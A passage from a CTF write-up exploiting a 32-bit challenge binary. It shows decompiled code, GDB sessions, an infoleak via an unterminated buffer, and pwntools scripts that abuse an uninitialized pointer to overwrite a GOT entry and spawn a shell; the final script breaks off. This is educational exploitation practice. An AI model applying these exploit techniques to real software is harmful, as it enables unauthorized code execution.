</span></span><span style="display:flex;"><span>      local_34 <span style="color:#f92672">=</span> local_34 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (local_10 <span style="color:#f92672">!=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(in_GS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x14</span>)) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">FUN_08048d40</span>();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>It basically checks if <code>local_44</code> which is malloc result is not null and if it&rsquo;s not null it sets <code>local_34</code> pointer to <code>local_44</code> pointer.
The problem here is that <code>local_34</code> is not initialized before the check, so if the check failed, <code>local_34</code> will be whatever was on the stack. This can let us write at whatever address was on stack.
After that it performs the rot13 operation on <code>local_40</code> which is our buffer and copies the result into <code>local_34</code>.</p>
<h2 id="exploitation">Exploitation<a href="#exploitation" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h2>
<p>So we have the ability to alter the LSB of the pointer to point to another location and also the ability to write into uninitialized pointer variable if the malloc call fail. Since the uninitialized variable is on the next stack frame (at lowers addresses), we can alter the LSB of the pointer to point to next stack frame, write a desired pointer address into the uninitialized pointer address and wait for rot13 operation into that address. Now the question is how can we fail malloc call. Since the malloc is in user controll it is pretty easy to fail it, by simply give too large size that can not be served. In this case a simple <code>-1</code> will do it .</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>gef➤  c
</span></span><span style="display:flex;"><span>Continuing.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>size: -1
</span></span><span style="display:flex;"><span>data: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Breakpoint 7, 0x08048b48 in ?? <span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> Legend: Modified register | Code | Heap | Stack | String <span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>────────────────────────────────────────────────────────────────────── registers ────
</span></span><span style="display:flex;"><span>$eax   : 0xffffffff
</span></span><span style="display:flex;"><span>$ebx   : 0x08052000  →  0x08051f0c  →  <span style="color:#e6db74">&#34;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX[...]&#34;</span>
</span></span><span style="display:flex;"><span>$ecx   : 0xffffffff
</span></span><span style="display:flex;"><span>$edx   : 0xffffd088  →  0xffffd0b8  →  0xffffd078  →  <span style="color:#e6db74">&#34;AAAAAAAAAAAAAAA&#34;</span>
</span></span><span style="display:flex;"><span>$esp   : 0xffffd040  →  0xffffffff
</span></span><span style="display:flex;"><span>$ebp   : 0xffffd0b8  →  0xffffd078  →  <span style="color:#e6db74">&#34;AAAAAAAAAAAAAAA&#34;</span>
</span></span><span style="display:flex;"><span>$esi   : 0xf7fca000  →  0x001d7d6c
</span></span><span style="display:flex;"><span>$edi   : 0x0       
</span></span><span style="display:flex;"><span>$eip   : 0x08048b48  →   call 0x8048620 &lt;malloc@plt&gt;
</span></span><span style="display:flex;"><span>$eflags: <span style="color:#f92672">[</span>zero carry PARITY ADJUST SIGN trap INTERRUPT direction overflow resume virtualx86 identification<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
</span></span><span style="display:flex;"><span>────────────────────────────────────────────────────────────────────────── stack ────
</span></span><span style="display:flex;"><span>0xffffd040│+0x0000: 0xffffffff	 ← $esp
</span></span><span style="display:flex;"><span>0xffffd044│+0x0004: 0x00000000
</span></span><span style="display:flex;"><span>0xffffd048│+0x0008: 0xffffd0b8  →  0xffffd078  →  <span style="color:#e6db74">&#34;AAAAAAAAAAAAAAA&#34;</span>
</span></span><span style="display:flex;"><span>0xffffd04c│+0x000c: 0x08048b12  →   mov BYTE PTR <span style="color:#f92672">[</span>ebp-0x5d<span style="color:#f92672">]</span>, al
</span></span><span style="display:flex;"><span>0xffffd050│+0x0010: 0xf7fcad80  →  0xfbad2887
</span></span><span style="display:flex;"><span>0xffffd054│+0x0014: 0x0000000a <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\n&#34;</span>?<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>0xffffd058│+0x0018: 0x0a000058 <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;X&#34;</span>?<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>0xffffd05c│+0x001c: 0xffffffff
</span></span><span style="display:flex;"><span>──────────────────────────────────────────────────────────────────── code:x86:32 ────
</span></span><span style="display:flex;"><span>    0x8048b41                  mov    eax, DWORD PTR <span style="color:#f92672">[</span>ebp-0x5c<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x8048b44                  sub    esp, 0xc
</span></span><span style="display:flex;"><span>    0x8048b47                  push   eax
</span></span><span style="display:flex;"><span>●→  0x8048b48                  call   0x8048620 &lt;malloc@plt&gt;
</span></span><span style="display:flex;"><span>   ↳   0x8048620 &lt;malloc@plt+0&gt;   jmp    DWORD PTR ds:0x805202c
</span></span><span style="display:flex;"><span>       0x8048626 &lt;malloc@plt+6&gt;   push   0x40
</span></span><span style="display:flex;"><span>       0x804862b &lt;malloc@plt+11&gt;  jmp    0x8048590
</span></span><span style="display:flex;"><span>       0x8048630 &lt;puts@plt+0&gt;     jmp    DWORD PTR ds:0x8052030
</span></span><span style="display:flex;"><span>       0x8048636 &lt;puts@plt+6&gt;     push   0x48
</span></span><span style="display:flex;"><span>       0x804863b &lt;puts@plt+11&gt;    jmp    0x8048590
</span></span><span style="display:flex;"><span>──────────────────────────────────────────────────────────── arguments <span style="color:#f92672">(</span>guessed<span style="color:#f92672">)</span> ────
</span></span><span style="display:flex;"><span>malloc@plt <span style="color:#f92672">(</span>
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">[</span>sp + 0x0<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> 0xffffffff,
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">[</span>sp + 0x4<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> 0x00000000
</span></span><span style="display:flex;"><span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>──────────────────────────────────────────────────────────────────────── threads ────
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#75715e">#0] Id 1, Name: &#34;chall01_patched&#34;, stopped 0x8048b48 in ?? (), reason: BREAKPOINT</span>
</span></span><span style="display:flex;"><span>────────────────────────────────────────────────────────────────────────── trace ────
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#75715e">#0] 0x8048b48 → call 0x8048620 &lt;malloc@plt&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#75715e">#1] 0x8048cad → mov eax, 0x0</span>
</span></span><span style="display:flex;"><span>─────────────────────────────────────────────────────────────────────────────────────
</span></span><span style="display:flex;"><span>gef➤  ni
</span></span><span style="display:flex;"><span>0x08048b4d in ?? <span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> Legend: Modified register | Code | Heap | Stack | String <span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>────────────────────────────────────────────────────────────────────── registers ────
</span></span><span style="display:flex;"><span>$eax   : 0x0       
</span></span><span style="display:flex;"><span>$ebx   : 0x08052000  →  0x08051f0c  →  <span style="color:#e6db74">&#34;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX[...]&#34;</span>
</span></span><span style="display:flex;"><span>$ecx   : 0x0       
</span></span><span style="display:flex;"><span>$edx   : 0x0       
</span></span><span style="display:flex;"><span>$esp   : 0xffffd040  →  0xffffffff
</span></span><span style="display:flex;"><span>$ebp   : 0xffffd0b8  →  0xffffd078  →  <span style="color:#e6db74">&#34;AAAAAAAAAAAAAAA&#34;</span>
</span></span><span style="display:flex;"><span>$esi   : 0xf7fca000  →  0x001d7d6c
</span></span><span style="display:flex;"><span>$edi   : 0x0       
</span></span><span style="display:flex;"><span>$eip   : 0x08048b4d  →   add esp, 0x10
</span></span><span style="display:flex;"><span>$eflags: <span style="color:#f92672">[</span>zero carry parity adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
</span></span><span style="display:flex;"><span>────────────────────────────────────────────────────────────────────────── stack ────
</span></span><span style="display:flex;"><span>0xffffd040│+0x0000: 0xffffffff	 ← $esp
</span></span><span style="display:flex;"><span>0xffffd044│+0x0004: 0x00000000
</span></span><span style="display:flex;"><span>0xffffd048│+0x0008: 0xffffd0b8  →  0xffffd078  →  <span style="color:#e6db74">&#34;AAAAAAAAAAAAAAA&#34;</span>
</span></span><span style="display:flex;"><span>0xffffd04c│+0x000c: 0x08048b12  →   mov BYTE PTR <span style="color:#f92672">[</span>ebp-0x5d<span style="color:#f92672">]</span>, al
</span></span><span style="display:flex;"><span>0xffffd050│+0x0010: 0xf7fcad80  →  0xfbad2887
</span></span><span style="display:flex;"><span>0xffffd054│+0x0014: 0x0000000a <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\n&#34;</span>?<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>0xffffd058│+0x0018: 0x0a000058 <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;X&#34;</span>?<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>0xffffd05c│+0x001c: 0xffffffff
</span></span><span style="display:flex;"><span>──────────────────────────────────────────────────────────────────── code:x86:32 ────
</span></span><span style="display:flex;"><span>    0x8048b44                  sub    esp, 0xc
</span></span><span style="display:flex;"><span>    0x8048b47                  push   eax
</span></span><span style="display:flex;"><span>●   0x8048b48                  call   0x8048620 &lt;malloc@plt&gt;
</span></span><span style="display:flex;"><span> →  0x8048b4d                  add    esp, 0x10
</span></span><span style="display:flex;"><span>    0x8048b50                  mov    DWORD PTR <span style="color:#f92672">[</span>ebp-0x58<span style="color:#f92672">]</span>, eax
</span></span><span style="display:flex;"><span>    0x8048b53                  mov    eax, DWORD PTR <span style="color:#f92672">[</span>ebp-0x5c<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x8048b56                  sub    esp, 0x4
</span></span><span style="display:flex;"><span>    0x8048b59                  push   eax
</span></span><span style="display:flex;"><span>    0x8048b5a                  push   DWORD PTR <span style="color:#f92672">[</span>ebp-0x58<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>──────────────────────────────────────────────────────────────────────── threads ────
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#75715e">#0] Id 1, Name: &#34;chall01_patched&#34;, stopped 0x8048b4d in ?? (), reason: SINGLE STEP</span>
</span></span><span style="display:flex;"><span>────────────────────────────────────────────────────────────────────────── trace ────
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#75715e">#0] 0x8048b4d → add esp, 0x10</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#75715e">#1] 0x8048cad → mov eax, 0x0</span>
</span></span><span style="display:flex;"><span>─────────────────────────────────────────────────────────────────────────────────────
</span></span><span style="display:flex;"><span>gef➤  p $eax
</span></span><span style="display:flex;"><span>$8 <span style="color:#f92672">=</span> 0x0
</span></span><span style="display:flex;"><span>gef➤ 
</span></span></code></pre></div><p>We can see here that the malloc call failed. Let&rsquo;s see now where is the uninitialized variable:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>   0x804895c:	cmp    DWORD PTR <span style="color:#f92672">[</span>ebp-0x40<span style="color:#f92672">]</span>,0x0
</span></span><span style="display:flex;"><span>   0x8048960:	je     0x8048a0b
</span></span><span style="display:flex;"><span>   0x8048966:	mov    eax,DWORD PTR <span style="color:#f92672">[</span>ebp-0x40<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>   0x8048969:	mov    DWORD PTR <span style="color:#f92672">[</span>ebp-0x30<span style="color:#f92672">]</span>,eax
</span></span><span style="display:flex;"><span>   0x804896c:	jmp    0x8048a0b
</span></span><span style="display:flex;"><span>   0x8048971:	call   0x80486b0 &lt;__ctype_b_loc@plt&gt;
</span></span><span style="display:flex;"><span>                .
</span></span><span style="display:flex;"><span>                .
</span></span><span style="display:flex;"><span>                .
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>gef➤  p $ebp-0x30
</span></span><span style="display:flex;"><span>$12 <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>void *<span style="color:#f92672">)</span> 0xffffd008
</span></span></code></pre></div><p>We can see here that it compares <code>[ebp-0x40]</code> address with <code>0x0</code> and if not null, it sets <code>[ebp-0x30]</code> to <code>[ebp-0x40]</code> address, so we can conclude that our uninitialized variable is at <code>ebp-0x30</code> which is <code>0xffffd008</code>. And since our pointer is at <code>0xffffd064</code>, we can alter the LSB with <code>0x08</code> so that we point to <code>0xffffd008</code> location and we can write the desire pointer address to it, the rot13 operation will be performed into that address.</p>
<p>Let&rsquo;s run this simple code to demonstrate it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./chall01_patched&#34;</span>)
</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>)
</span></span><span style="display:flex;"><span>ld <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./ld-2.27.so&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> exe
</span></span><span style="display:flex;"><span>target <span style="color:#f92672">=</span> process([exe<span style="color:#f92672">.</span>path])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;size: &#34;</span>)
</span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;-1&#34;</span>)
</span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;data: &#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;AAAAAAAAAAAAAAAAAAAAAAA&#34;</span>  <span style="color:#75715e"># what to write at address</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>                     <span style="color:#75715e"># null terminate it to ensure everything is ok</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>len(payload))    <span style="color:#75715e"># fill the buffer until the pointer is reached</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x08</span><span style="color:#e6db74">&#34;</span>                     <span style="color:#75715e"># overwrite LSB with 0x8 (the pointer will point now to unintialized variable location )</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p32( <span style="color:#ae81ff">0x41424344</span> )           <span style="color:#75715e"># write  our unintialized variable pointer address (address where we want to write )</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pause()
</span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>pause()
</span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>interactive()</span></span></code></pre></div>
<p>In gdb, before the malloc,</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>gef➤  x/30xw $esp
</span></span><span style="display:flex;"><span>0xffffd044:	0x00000000	0xffe7a9b8	0x08048b12	0xf7f2bd80
</span></span><span style="display:flex;"><span>0xffffd054:	0x0000000a	0x0a000058	0xffffffff	0x00000000
</span></span><span style="display:flex;"><span>0xffffd064:	0x41414141	0x41414141	0x41414141	0x41414141
</span></span><span style="display:flex;"><span>0xffffd074:	0x41414141	0x00414141	0x41414141	0x41414141
</span></span><span style="display:flex;"><span>0xffffd084:	0x41414141	0x41414141	0x41414141	0x41414141
</span></span><span style="display:flex;"><span>0xffffd094:	0x41414141	0x41414141	0x41414141	0x41414141
</span></span><span style="display:flex;"><span>0xffffd0a4:	0xffe7a90d	0x00000000	0xad56ed00	0xf7f2bd80
</span></span><span style="display:flex;"><span>0xffffd0b4:	0x08052000	0xffe7a998
</span></span><span style="display:flex;"><span>gef➤  x/30xw 0xffe7a900
</span></span><span style="display:flex;"><span>0xffffd000:	0xf7f2b5c0	0x08047284	0x41424344	0xf7dc6f00
</span></span><span style="display:flex;"><span>0xffffd010:	0xf7dc7277	0x08052000	0xf7f2b5c0	0xf7dc1329
</span></span><span style="display:flex;"><span>0xffffd020:	0xf7f2b5c0	0x08052000	0xf7f2b000	0x00000000
</span></span><span style="display:flex;"><span>0xffffd030:	0xffe7a9b8	0xf7f4be20	0xf7f2c890	0x08052000
</span></span><span style="display:flex;"><span>0xffffd040:	0xf7f2b000	0x00000000	0xffe7a9b8	0x08048b12
</span></span><span style="display:flex;"><span>0xffffd050:	0xf7f2bd80	0x0000000a	0x0a000058	0xffffffff
</span></span><span style="display:flex;"><span>0xffffd060:	0x00000000	0x41414141	0x41414141	0x41414141
</span></span><span style="display:flex;"><span>0xffffd070:	0x41414141	0x41414141
</span></span><span style="display:flex;"><span>gef➤  
</span></span></code></pre></div><p>We can see that at <code>0xffffd008</code> , we have our pointer <code>0x41424344</code> and this is where it will write the rot13 result. Here it end with Segmantation Fault because this is a non valid address. So now we know how to write to any address (but we should pay attention to rot13 transformation). We can overwrite a <code>GOT</code> address of a given function with the address of <code>system</code>, so that if we call this function it will call system instead. But we need a function whose the first argument we control because we want <code>system</code> to call <code>/bin/sh</code>. <code>memset</code> is a good candidate since her first argument is our buffer (our inputed data). So we will overwrite <code>memset GOT</code> with the address of <code>system</code> using our uninitialised buffer primitive and for the next input we will give <code>/bin/sh</code> as data so that at <code>memset</code> call , we will have a shell.</p>
<p>But wait, how can we have a right <code>system</code> address ?  we need the infoleak to figure out where the <code>system</code> is.</p>
<h4 id="infoleak">Infoleak<a href="#infoleak" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h4>
<p>Remember that we suppose <code>PIE</code> is enabled, so we need a libc infoleak to break <code>ASLR</code> and call <code>system</code>. The libc infoleak will allow us to break <code>ASLR</code> and know the address of everything.
At first glance, we can think that the program don&rsquo;t give us any read primitive, but it&rsquo;s not true. Remember the famous <code>\r</code> I talked about.
Our buffer will not be null byte terminated if we send it and since <code>printf</code> print all bytes up to a null byte and after the rot13 operation our output buffer will also not be null byte terminated , the <code>printf(&quot;resp: %s\n&quot;,local_5c);</code> calls will print all the bytes until reaching null byte. This leak some address as we can see below:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting local process <span style="color:#e6db74">&#39;/home/user/Desktop/training/ctf-challs/pwnyracing/chall01/solution/chall01/chall01/chall01_patched&#39;</span>: pid <span style="color:#ae81ff">371389</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;resp: NNNN\x80\xad\xf7\xf7\x87(\xad\xfb\xb8\xe2\xc2\xff \xae\xf9\xf7X\x9b\xe0\xf7\n&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/30xw 0x950d160
</span></span><span style="display:flex;"><span>0x984b160:	0x4e4e4e4e	0xf7f7ad80	0xfbad2887	0xffc2e2b8
</span></span><span style="display:flex;"><span>0x984b170:	0xf7f9ae20	0xf7e09b58	0x00000000	0x00000000
</span></span><span style="display:flex;"><span>0x984b180:	0x00000000	0x00000000	0x00000000	0x00000000
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/xw 0xf7fc2d80
</span></span><span style="display:flex;"><span>0xf7fc2d80 &lt;_IO_2_1_stdout_&gt;:	0xfbad2887
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/xw 0xfbad2887
</span></span><span style="display:flex;"><span>0xfbad2887:	Cannot access memory at address 0xfbad2887
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/xw 0xf7fe2e20
</span></span><span style="display:flex;"><span>0xf7fe2e20:	0x240c8b5a
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/xw 0xf7e51b58
</span></span><span style="display:flex;"><span>0xf7e51b58 &lt;puts+11&gt;:	0x00031644
</span></span></code></pre></div><p>So we can see that the last one is a libc address of <code>puts+11</code>. We can simply use it to have our libc infoleak. <br>
The last thing we need is a function that can convert back from rot13 or convert to rot13 because the rot13 operation can alter some byte in our pointer, so we need to pay attention to it. I simply create a function that for the conversion stuff. So we obtain our leak:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Leak puts+11 @  0xf7dd0b4b
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Libc base @ 0xf7d69000
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Addr system @ 0xf7da6200
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Addr execl @ 0xf7e28870
</span></span></code></pre></div><p>We can see here that <code>system</code> address contain a null byte and this is a problem for us because the overwrite process will stop at null byte. However, this is not a big problem, we can call others functions like <code>execve</code> , <code>execl</code> instead of <code>system</code>. <code>execl</code> is a good candidate because it doesn&rsquo;t require <code>envp</code> pointer.
So we&rsquo;re going to call <code>execl</code> to get a shell.</p>
<h2 id="exploit">Exploit<a href="#exploit" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h2>
<p>Putting it all together, we get the following exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./chall01_patched&#34;</span>)
</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>)
</span></span><span style="display:flex;"><span>ld <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./ld-2.27.so&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> exe
</span></span><span style="display:flex;"><span>target <span style="color:#f92672">=</span> process([exe<span style="color:#f92672">.</span>path])
</span></span><span style="display:flex;"><span><span style="color:#75715e">#gdb.attach(target, &#39; source ~/breakpoint.txt&#39;)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">####  Infoleak </span>
</span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;size: &#34;</span>)
</span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
</span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;data: &#34;</span>)
</span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>send( <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;AAAA&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>recv <span style="color:#f92672">=</span> target<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span><span style="color:#75715e">####</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(recv )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>b_leak_puts_11 <span style="color:#f92672">=</span> recv[<span style="color:#f92672">-</span><span style="color:#ae81ff">5</span>: <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rot13_f</span>(string<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>):
</span></span><span style="display:flex;"><span>    rot13 <span style="color:#f92672">=</span> str<span style="color:#f92672">.</span>maketrans(
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#print(bytearray(string))</span>
</span></span><span style="display:flex;"><span>    b <span style="color:#f92672">=</span> bytearray(string)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(b)):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(chr(b[i])<span style="color:#f92672">.</span>isalnum() <span style="color:#f92672">==</span> <span style="color:#66d9ef">True</span>):
</span></span><span style="display:flex;"><span>            b[i] <span style="color:#f92672">=</span> ord(chr(b[i])<span style="color:#f92672">.</span>translate(rot13))
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#print(b)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> bytes(b)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>leak_puts_11 <span style="color:#f92672">=</span> rot13_f(b_leak_puts_11)
